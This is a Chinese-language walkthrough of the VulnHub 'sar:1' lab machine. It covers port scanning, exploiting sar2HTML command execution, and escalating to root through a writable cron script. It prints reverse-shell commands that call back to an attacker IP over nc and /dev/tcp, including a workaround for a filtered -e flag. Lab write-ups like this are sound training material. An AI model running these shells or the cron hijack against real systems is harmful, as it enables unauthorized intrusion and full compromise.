

## 靶机地址

https://www.vulnhub.com/entry/sar-1,425/



## 信息收集阶段

进行全端口扫描，枚举目标的端口和服务

```shell
nmap -n -v -sS --max-retries=0 -p- 172.16.33.13
```



<img src="https://cos.kevinc.ltd/file/download?fileId=804" style="zoom: 50%;" />

```shell
nmap -sV -p80 -A 172.16.33.13
```



只有80端口放通，扫描端口服务版本

<img src="https://cos.kevinc.ltd/file/download?fileId=805" style="zoom: 33%;" />

访问web服务，发现是`apache`默认页面，无可用信息

<img src="https://cos.kevinc.ltd/file/download?fileId=806" style="zoom: 33%;" />

使用`dirsearch`对目录进行扫描，发现有敏感文件`phpinfo.php`和`robots.txt`

<img src="https://cos.kevinc.ltd/file/download?fileId=808" style="zoom: 33%;" />

访问`robots.txt`，发现有`sar2HTML`, 访问一下

<img src="https://cos.kevinc.ltd/file/download?fileId=809" style="zoom: 33%;" />





## 利用漏洞拿shell

使用`searchsploit`查询有无`sar2HTML`的漏洞利用代码，结果如下

<img src="https://cos.kevinc.ltd/file/download?fileId=810" style="zoom: 33%;" />

看一下具体内容，其实`py`文件就是`txt`文件的代码实现，使用`py`脚本

<img src="https://cos.kevinc.ltd/file/download?fileId=811" style="zoom: 33%;" />

拿到普通权限，需要在远程主机弹一个shell回攻击机

尝试执行命令 `nc 10.8.0.17 8888 -e /bin/bash`，然后在攻击机上执行 `nc -nvlp 8888`

没有弹成功，怀疑是命令执行过滤了`-e`参数

有两种思路可以绕过，都可以成功执行

第一为**NC串联** 

```shell
> sar-command
nc 10.8.0.17 6666 | /bin/bash | nc 10.8.0.17 8888

> kali
> 开两个窗口

nc -nvlp 6666 # 用于输入命令
nc -nvlp 8888 # 用于输出结果
```

效果如下

<img src="https://cos.kevinc.ltd/file/download?fileId=812" style="zoom: 33%;" />

第二种为**对反弹shell进行编码**

<img src="https://cos.kevinc.ltd/file/download?fileId=813" style="zoom: 33%;" />



## 提权

先用`linpeas.sh`脚本对提权信息进行收集

发现有一个计划任务可尝试利用

<img src="https://cos.kevinc.ltd/file/download?fileId=814" style="zoom: 33%;" />

查看改脚本文件，发现执行的是另一个脚本文件`write.sh`，查看权限发现其可写可执行，尝试写shell

<img src="https://cos.kevinc.ltd/file/download?fileId=815" style="zoom: 33%;" />

```shell
echo "bash -c 'exec bash -i &>/dev/tcp/10.8.0.17/6666 >&1'" > write.sh
```

攻击机上监听 6666 端口，过一段时间即可获得 root 权限

<img src="https://cos.kevinc.ltd/file/download?fileId=816" style="zoom: 33%;" />
